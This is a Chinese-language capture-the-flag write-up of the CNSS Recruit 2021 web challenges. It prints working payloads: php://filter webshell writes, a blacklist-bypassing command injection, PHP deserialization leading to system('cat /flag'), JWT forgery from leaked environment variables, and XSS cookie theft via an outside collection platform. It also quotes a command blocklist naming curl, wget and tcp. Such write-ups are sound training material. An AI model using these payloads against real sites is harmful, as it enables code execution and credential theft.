---
title: cnss2021-web部分
id: cnss2021-web部分
date: 2021-10-31 12:40:30
sidebar_position: 7
---

<!-- more -->

> 还差4题web没写~还是差点了捏
>
> 比赛大概是31号结束的？后面还想等wp复现捏，可惜变成难忘今宵啦

21号在群里听师傅们提到cnss，求来了链接[CNSS Recruit 2021](https://recruit.cnss.io/problems)

发现很多学校的招新赛都挺有意思的，也能发现自己平时没注意到的知识点

打ctf还是得多做题，多和师傅们交流~



## 🙋‍ 我一定要试试 Web 方向

> # Web 方向做题须知
>
> 1. Web 题目为每道题目描述里给出的链接地址所指向的 Web 应用
> 2. flag 格式统一为 cnss{} 花括号中间为有意义的字符串，通常会以 _ 区分单个单词（CNSS 大小写形式都有可能,括号内包裹的内容一般会经过 [leet](https://zh.wikipedia.org/zh-cn/Leet) 处理）
> 3. hint 意为提示，是出题人给出的解题提示，并不要求你在 flag 提交处作答
> 4. 当你成功得到 flag 时，flag 一定是以 cnss{} 的形式显示的 所以不需要自己手动添加 cnss{} (如果有那你找到的一定不是 flag
>
> 
>
> ### 做题要求
>
> 
>
> 1. 要会看 **HTML** 源码
> 2. 能读懂简单的 **PHP** 代码
> 3. 懂一点点 **HTTP** 报文
> 4. 学会使用 **Burpsuite** 的 **Repeater, Intruder** 模块
>
> 
>
> ### 常用工具
>
> 
>
> 1. **[Burp Suite](https://portswigger.net/burp/releases)**
> 2. Metasploit
> 3. **AntSword**
> 4. F12 开发者工具，插件如 **Hackbar** 等
>
> PS: 浏览器请使用 Firefox/Chrome
>
> 
>
> ### 学习参考
>
> 
>
> 1. 学会使用 **搜索引擎(尤指 [Google](https://www.google.com/ncr))** 搜索关键字以找到自己需要的学习资料
> 2. 从别人的 **博客文章**/**官方文档** 中学习
> 3. 书籍和视频中学到的大多是系统全面的知识，但是相应的效率便低了
> 4. 针对性学习和系统性学习，需要每个人结合自身情况进行均衡
>
> ```
> CNSS{VVeb_i5_v3ry_1nt3re5ting}
> ```

## [👶Baby] Signin

改用post传参得到源码

```php
<?php
error_reporting(0);
require_once("flag.php");
if($_SERVER['REQUEST_METHOD'] !=='POST'){
    die("Please Change Your Method!");
    exit();
}else{
    if(!isset($_POST["CNSS"])){
        show_source(__FILE__);
    }
    else if($_POST["CNSS"] === "join"){
        if((isset($_GET["web"])) && (($_GET["web"]) === "like")){
            setcookie("flag","0");
            if($_COOKIE['flag'] === '1'){
                echo $flag;
            }else{show_source(__FILE__);}
        }else{
            show_source(__FILE__);
        }
    }
}

```

![](https://i.loli.net/2021/10/09/Q6XDg2vWEmenMxN.png)



## [👶Baby]D3buger

禁用右键和f12等等一系列操作

先找个页面开f12，再hackbar访问就行

flag在js里，
彩蛋是[Never Gonna Give You Up - Rick Astley_bilibili](https://www.bilibili.com/video/BV1GJ411x7h7)

```
view-source:http://81.68.109.40:30001/js/fuck.js
```

![](https://i.loli.net/2021/10/09/rCZP2uQFV8XiEec.png)



## [👶Baby]GitHacker

感谢捷宝的贡献

Git_Extract：[gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)](https://github.com/gakki429/Git_Extract)

把.git目录弄下来

![](https://i.loli.net/2021/10/08/HSFB1U59T8Zmjwy.png)

执行fsck（文件系统检测）命令
`git fsck --lost-found`
这个命令会把悬空的blob恢复文件列举出来

![](https://i.loli.net/2021/10/08/4PckyLimsYEaWnF.png)

这时就可以通过`git show 11b2d674cc83c17990150726b4653bfe3c78c807` 命令查看当前哈希值对象的具体内容

![](https://i.loli.net/2021/10/08/oSHnD35TiAbUy8m.png)







## [😃Easy]更坑的数学题

```python
import requests
import re

url = 'http://81.68.109.40:30005/'
s = requests.session()
r = s.get(url)
a = eval(re.search(r'(\d+[=\-*])+\d+', r.text).group())
print(s.post(url, data={'res': a}).text)

```





## [😃Easy]Ezp#p

```php
<?php
    error_reporting(0);
    require_once("flag.php");
    show_source(__FILE__);

    $pass = '0e0';
    $md55 = $_COOKIE['token'];
    $md55 = md5($md55);

    if(md5($md55) == $pass){
        if(isset($_GET['query'])){
            $before = $_GET['query'];
            $med = 'filter';
            $after = preg_replace(
                "/$med/", '', $before
            );
            if($after === $med){
                echo $flag1;
            }
        }
        $verify = $_GET['verify'];
    }

    extract($_POST);
    
    if(md5($verify) === $pass){
        echo $$verify;
    }


?>
```

poc

```php
<?php

$pass = '0e0';

for ($i=0;$i<=100000000000;$i++){
    $md55 = $i;
    if(md5(md5($md55)) == $pass){
        echo $i;
        exit(0);
    }
}
```

![](https://i.loli.net/2021/10/09/uzEq6QI83a7xJb4.png)

flag1：找md5(md5(xxx))为0exxx的值，这里给一个`179122048`，filter双写绕过

flag2：利用extract变量覆盖的特性，传入verify为flag2，pass为对应的md5值即可

![](https://i.loli.net/2021/10/08/BGn129avm6gROwY.png)





## [😃Easy]China Flag

如下，再次感谢捷宝作出的贡献，我还是浮躁了，整到xff就没想着尝试了==

![](https://i.loli.net/2021/10/08/fcWze493Sos5LvQ.png)

## [😮Mid]太极掌门人

```php
<?php
    error_reporting(0);
    show_source(__FILE__);

    function deleteDir($path) {

        if (is_dir($path)) {
            $dirs = scandir($path);
            foreach ($dirs as $dir) {
                if ($dir != '.' && $dir != '..') {
                    $sonDir = $path.'/'.$dir;
                    if (is_dir($sonDir)) {

                        deleteDir($sonDir);

                        @rmdir($sonDir);

                    } elseif ($sonDir !== './index.php'
                            && $sonDir !== './flag.php') {

                        @unlink($sonDir);

                    }
                }
            }
            @rmdir($path);
        }
    }

    $devil = '<?php exit;?>';

    $goods = $_POST['goods'];

    file_put_contents($_POST['train'], $devil . $goods);

    sleep(1);

    deleteDir('.');

?>
```

参考文章：

1. [`<?php exit;?>`绕过 - cooyf's blog](https://www.cooyf.com/notes/php_exit.html)
2. [谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=1#_2)
2. [探索php伪协议以及死亡绕过 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/266565.html)

### 解法1：base64编码与解码

原理是base64不会解码`<` `>` `?` `;` `空格`这些，那么把代码base64编码，再用php://filter协议写入就行

ps：注意base64是以4byte一组解码，`<?php exit;?>`除了`<` `>` `?` `;` `空格`这些，一共`7`个字符，那么给它随便加一个a就行

payload：

```
goods=aPD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=convert.base64-decode/resource=a.php
```

> 如上生成的代码就会是：
>
> ```
> <?php exit;?>aPD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==
> 
> 然后base64解码后写入a.php里
> （我写的是<?php system("cat ./flag.php");）
> ```
>
> 



### 解法2：strip_tags()字符串操作函数

> ```
> strip_tags	(PHP 4, PHP 5, PHP 7, PHP 8)
> 
> strip_tags — 从字符串中去除 HTML 和 PHP 标记
> ```
>
> `<?php exit; ?>`实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。

跟着P神的文章测试一下：

```php
<?php 
echo readfile('php://filter/read=string.strip_tags/resource=php://input');
```

可以看到传入的`<?php exit; ?>`已经被去除了
但我们要写入的一句话也是php代码，如果使用了strip_tags，一句话同样会被去除掉![](https://i.loli.net/2021/11/03/AuDo9EZseJvdVPX.png)

不过`php://filter`允许使用多个过滤器，只需要使用`|`间隔开来就好
先用`strip_tags`去除`<?php exit; ?>`，再用base64-decode解码咱们传入的base64编码后的一句话

payload：

```php
goods=PD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=string.strip_tags|convert.base64-decode/resource=a.php
```

### 解法3：string.rot13

> `<?php exit; ?>`在经过rot13编码后会变成`<?cuc rkvg; ?>`，
> 在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了：

用的是过滤器`string.rot13`，
需要php不开启短标签（short_open_tag）即`php.ini中short_open_tag = Off`

```
goods=PD9waHAgc3lzdGVtKCJjYXQgLi9mbGFnLnBocCIpOw==&train=php://filter/write=string.rot13/resource=a.php
```



### 拿flag

因为会删掉当前目录下的文件，所以得条件竞争访问，上面的payload都可以用

post，然后bp抓包，爆破模块疯狂重发包~

![](https://i.loli.net/2021/10/08/2KLtoVPuF39v7US.png)

访问a.php，查看源代码

![](https://i.loli.net/2021/10/08/lyCt7Gp3vkDThoJ.png)





## [😮Mid]BlackPage

```
<!-- \<\?phps
$file = $_GET["file"];
$blacklist = "(**blacklist**)";
if (preg_match("/".$blacklist."/is",$file) == 1){
  exit("Nooo,You can't read it.");
}else{
  include $file;
}
//你能读到 mybackdoor.php 吗？

---->
```

伪协议读mybackdoor.php

```
http://121.41.7.149:65002/?file=php://filter/convert.base64-encode/resource=mybackdoor.php
```

得到mybackdoor.php源码：

```php
<?php
error_reporting(0);
function blacklist($cmd){
  $filter = "(\\<|\\>|Fl4g|php|curl| |0x|\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\$\\{IFS\\}|index|\\*)";
  if (preg_match("/".$filter."/is",$cmd)==1){  
      exit('Go out! This black page does not belong to you!');
  }
  else{
    system($cmd);
  }
}
blacklist($_GET['cmd']);
?>
```

`''`绕过关键字过滤、`%09`(制表符)绕过空格、占位符`?`匹配

payload：

```
http://121.41.7.149:65002/mybackdoor.php?cmd=ca''t%09/Fl??????????
```



## [😯Mid]bestLanguage

```php
<?php

error_reporting(0);

class superGate{
    public $gay = true;

    function __destruct(){
        echo file_get_contents("/flag");
        die();
    }
}

$p = $_GET['p'];
$honey = unserialize($p);
if(preg_match("/superGate/i", serialize($honey))){
    echo "no";
    throw Exception();
}

show_source(__FILE__);
```

superGate是肯定要的--，但是会触发`throw Exception();`抛出异常从而停止执行代码

先本地测试一下，报错是`调用了未定义的函数 Exception()`

![](https://i.loli.net/2021/10/09/woEfjvqlybZn1iJ.png)

那么定义一个就行--

poc：

```php
<?php

class superGate{
    public $gay = true;
    function __construct(){
        $this->gay = new Exception("666");
    }
}

$a = new superGate();
echo serialize($a);
```

![](https://i.loli.net/2021/10/09/8vKA3COYqn4tQbc.png)



## [😮Mid]To_be_Admin

/read接口可以读文件，/admin判断用户

一开始是想jwt的，但是爆破爆不出来密钥，猜测是得read读取一些什么

突破口是，捷宝搜到说可以读环境变量/proc/self/environ

http://121.41.7.149:65003/read?file=/proc/self/environ

发现有个key，作为密钥，jwtio改写一下就可

![](https://i.loli.net/2021/10/17/iw1grFnQ8dsejhP.png)

![](https://i.loli.net/2021/10/17/KvBJIyiQFgsWTMO.png)

![](https://i.loli.net/2021/10/17/ILjmdhFB45rNOki.png)







## [😮Mid]To_be_Admin_Again

```php
# index.php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
highlight_file(__FILE__);
class CNSS{
    private $username = 'guest';
    private $code = 'phpinfo();';
    public function __construct(){
        $this->username = $username;
        $this->code = $cmd;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if($this->username === 'admin'){
            eval($this->code);
        }
    }
}

// You must be interested in save.php
```

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
highlight_file(__FILE__);
if (isset($_GET['cnss'])) {
    $_SESSION['cnss'] = $_GET['cnss'];
}
```

逻辑很简单，绕过__wakeup使得username为admin即可

主要利用点在于：两个文件的session.serialize_handler不同引起的反序列化：
[带你走进PHP session反序列化漏洞 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/6640)
[深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)](https://www.jb51.net/article/116246.htm)

步骤如下：

poc:

```php
<?php

class CNSS{
    private $username = 'admin';
    private $code = 'system("cat /flag");';
}


$a = new CNSS();
echo urlencode('|'.serialize($a));
```

1. 生成payload，记得改属性数目来绕过__wakeup
2. 访问save.php借助cnss传payload，让网页获得seesion数据
3. 再从save.php跳转至index.php，确保session不变，由于引擎不同就会触发反序列化，然后再触发`__destruct()`方法执行`eval()`

![](https://i.loli.net/2021/10/08/w2oi6UJxeHELBjs.png)

payload:

```
http://121.41.7.149:65004/save.php?cnss=%7CO%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D
```

然后再访问：即可触发

```
http://121.41.7.149:65004/
```





## [😮Mid]To_be_Admin_Again_and_Again

明显的xss

xss平台弹cookie过来就可以

https://xss.pt/xss.php

![](https://i.loli.net/2021/10/08/r8dRa4JjG2teOIn.png)

验证码用脚本跑：

```python
import hashlib
l = 'qwertyuiopasdfghjklzxcvbnm1234567890'
for i in l:
    for j in l:
        for k in l:
            for m in l:
                for n in l:
                    for o in l:
                        for p in l:
                            for q in l:
                                f = i + j + k + m + n + o + p + q
                                sha = hashlib.sha256(f.encode(encoding='UTF-8')).hexdigest()
                                if sha[:6] == 'bacbd7':
                                    print(f)
                                    print(sha)
                                    exit(0)
```

拿到cookie后访问/admin即可

![](https://i.loli.net/2021/10/08/c1iOpuELVd5R6vz.png)





